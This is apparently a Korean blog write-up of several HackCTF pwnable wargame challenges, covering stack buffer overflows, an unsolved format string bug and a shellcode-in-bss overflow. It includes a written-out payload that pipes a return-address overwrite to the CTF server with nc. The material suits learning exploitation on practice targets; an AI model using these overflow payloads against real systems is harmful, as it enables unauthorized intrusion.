---
layout: post
title:  "HackCTF Pwnable - first line"
excerpt: "for All Clear HackCTF"
date:   2020-02-23
categories: [wargame]
comments: true
---

### 1. Basic_BOF #1

binary :



![img](https://k.kakaocdn.net/dn/Qmd27/btqCbUwEpAQ/uAs84B8ONS8Jd1bSLrMgVK/img.png)



main :



![img](https://k.kakaocdn.net/dn/deHnH7/btqCcAYMczl/ctcgj8WsHcWLvaAnscOCu1/img.png)



뭐 굳이 쉘코드를 넣을 필요도 없다. 그냥 v5변수 값이 -559038737이면 되는데 이게 0xDEADBEEF이다. 

payload :



![img](https://k.kakaocdn.net/dn/qDDSo/btqCbhyTomw/EZbGrjMkM9azK5HbJQp941/img.png)



### 2. Basic_BOF #2

binary :



![img](https://k.kakaocdn.net/dn/GwpYi/btqCaSzsjbw/WWGUvbCmAgjx6lRjRmLoB1/img.png)



 

main : 



![img](https://k.kakaocdn.net/dn/dIpOaN/btqCevvsn1n/oLXo7yUcHyI6JaAL66K911/img.png)



이번에도 딱히 뭐 없다. 그냥 v5변수에 sup함수를 넣는다. 그럼 여기서 128바이트를 더미로 채우고 0804849b를 ret로 넘겨주면 된다.

payload :

dummy(128) + p32(0x0804849b)

$(python -c 'print "A"*128 + "\x9b\x84\x04\x08"'; cat) | nc ctf.j0n9hyun.xyz 3001

### 3. Basic_FSB

binary :



![img](https://k.kakaocdn.net/dn/baYotp/btqCckaM97S/RTfbntEvGEmkFEqlcRdJ1K/img.png)



main :



![img](https://k.kakaocdn.net/dn/EuAcJ/btqCeu4n4eX/r1S4IRCEewUVDsznAkHxt1/img.png)



vuln :



![img](https://k.kakaocdn.net/dn/cG6XkO/btqCeva9EXE/IRiXjpvCANw7Nkbcgxi5j1/img.png)



이 함수의 snprintf와 밑에 &format에서 fsb취약점이 터진다. 

flag :



![img](https://k.kakaocdn.net/dn/ds5pn8/btqCd0CsBqI/5koJMr7OJrFztYAXlYK4O0/img.png)



자 . fsb문제다.  Partial RelRO니까 GOT overwrite가 가능할 것이다. 

근데 아직 못풀음 ㅎㅎ 

### 4. 내 버퍼가 흘러넘친다!!!

binary :



![img](https://k.kakaocdn.net/dn/eskYay/btqCcCI4yQW/aRlrsLZGiuk8LQwc15sufK/img.png)



main :



![img](https://k.kakaocdn.net/dn/rwwkC/btqCeuQQGds/LArvHfcRZx4rJq6MWvOg51/img.png)



매우 간단하다. read함수로 name값을 50을 받아오는데 여기서 취약점이 발생한다. 한가지  신경써야할 점은 name변수가 bss영역에 존재하기 때문에 이를 이용해서 해결하는 점이다. 

payload :

dummy(13) + shellcode(24) + dummy(13)



![img](https://k.kakaocdn.net/dn/umjbX/btqCd1g4akZ/kXPcwTFFv6qRTbVRqzpNWk/img.png)



해결 후 확인해보니 , 초기화 되지 않는 정적변수인 name에 쉘코드를 넣고 , input에서 dummy를 넘겨준 후 name의 주소를 전송하는 풀이도 많은 것 같다. 
